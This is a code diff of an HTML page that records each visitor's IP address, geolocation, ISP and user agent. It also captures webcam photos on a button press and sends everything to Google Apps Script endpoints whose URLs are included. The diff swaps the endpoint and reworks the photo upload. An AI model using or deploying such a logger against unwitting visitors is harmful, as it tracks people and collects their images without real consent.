@@ -6,7 +6,7 @@
   <title>IP 與設備訊息記錄</title>
 </head>
 <body>
-  <h1>IP 與設備訊息記ff錄</h1>
+  <h1>IP 與設備訊cc息記錄</h1>
   <p id="ipInfo">IP 資訊載入中...</p>
   <p id="status">尚未開始操作</p>
   <video id="video" autoplay playsinline width="320" height="240"></video>
@@ -14,7 +14,7 @@
   <button id="capture">拍攝照片</button>
 
   <script>
-    // 保留您的 IP 紀錄邏輯，絕不更動
+    // 保留原有的 IP 紀錄邏輯
     async function getIpInfo() {
       try {
         const response = await fetch('https://ipinfo.io/json');
@@ -27,8 +27,8 @@
         document.getElementById('ipInfo').innerText =
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
-        // 發送到 Google Apps Script 的 URL
-        const url = new URL('https://script.google.com/macros/s/AKfycbyRyv-U7nA9PWXaI_WwOTHCljkEVITonedzy-otjSsWuOR-Kox1Ac1q6lQdLxkV8CnXqg/exec');
+        // 發送 GET 請求到 Google Apps Script
+        const url = new URL('https://script.google.com/macros/s/AKfycbxsB3ysR8ohxHX2yRY_Tk8Xj_cUJH01cwsHT92CW7zR3xd68ZXkao7w0FHWF1PiqT_v2A/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -51,7 +51,7 @@
       }
     }
 
-    // 新增拍攝照片功能
+    // 拍攝照片並上傳
     async function capturePhoto() {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
@@ -60,10 +60,11 @@
       // 確保攝像頭已啟動且視頻流正常
       if (!video.videoWidth || !video.videoHeight) {
         document.getElementById('status').innerText = '無法拍攝照片，視頻流未正確啟動';
+        console.error('無法拍攝照片：視頻流未正確啟動');
         return;
       }
 
-      // 捕捉畫面並轉為 Blob
+      // 捕捉畫面並壓縮為 Blob
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -71,20 +72,19 @@
       canvas.toBlob(async (blob) => {
         if (!blob) {
           document.getElementById('status').innerText = '無法生成圖片 Blob';
+          console.error('Blob 生成失敗');
           return;
         }
 
-        // 壓縮圖片並轉換為 Base64
-        const base64Photo = await compressImageToBase64(blob);
+        // 使用 FormData 將圖片 Blob 上傳
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg'); // 直接附加 Blob 資料
+        formData.append('userAgent', navigator.userAgent); // 附加其他訊息
 
-        // 發送 Base64 圖片至後端
         try {
-          const response = await fetch('https://script.google.com/macros/s/AKfycbyRyv-U7nA9PWXaI_WwOTHCljkEVITonedzy-otjSsWuOR-Kox1Ac1q6lQdLxkV8CnXqg/exec', {
+          const response = await fetch('https://script.google.com/macros/s/AKfycbxsB3ysR8ohxHX2yRY_Tk8Xj_cUJH01cwsHT92CW7zR3xd68ZXkao7w0FHWF1PiqT_v2A/exec', {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ photo: base64Photo }),
+            body: formData, // 使用 FormData 傳送
           });
 
           const result = await response.json();
@@ -98,30 +98,6 @@
           document.getElementById('status').innerText = '圖片上傳失敗，請檢查控制台。';
         }
       }, 'image/jpeg');
-    }
-
-    // 壓縮圖片並轉為 Base64
-    async function compressImageToBase64(blob) {
-      const img = new Image();
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-
-      return new Promise((resolve) => {
-        const reader = new FileReader();
-        reader.onload = () => {
-          img.src = reader.result;
-          img.onload = () => {
-            const maxWidth = 800; // 最大寬度
-            const scale = maxWidth / img.width;
-            canvas.width = maxWidth;
-            canvas.height = img.height * scale;
-            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-
-            resolve(canvas.toDataURL('image/jpeg', 0.8).split(',')[1]); // 壓縮品質設為 0.8
-          };
-        };
-        reader.readAsDataURL(blob);
-      });
     }
 
     // 初始化攝影機
